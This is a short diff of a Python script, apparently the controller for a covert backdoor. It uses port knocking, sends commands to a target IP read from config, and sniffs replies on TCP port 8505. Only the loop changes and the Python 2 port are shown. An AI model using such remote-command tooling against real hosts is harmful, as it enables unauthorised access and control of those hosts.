@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#!/usr/bin/python
 
 import time, os, sys, logging
 import config
@@ -7,7 +7,7 @@ from scapy.all import *
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 results = ""
-targetIP = ""
+targetIP = config.targetIP
 
 def checkRootPrivilege():
     if os.getuid() != 0:
@@ -40,9 +40,7 @@ def main():
     portKnocking()
 
     while True:
-        targetIP = input("Enter the target IP: ")
-        cmd = input("Enter command: ")
-
+        cmd = raw_input("Enter command: ")
         sendCommand(cmd)
         while True:
             sniff(filter="tcp and dst port 8505", count=1, prn=recvCommand)
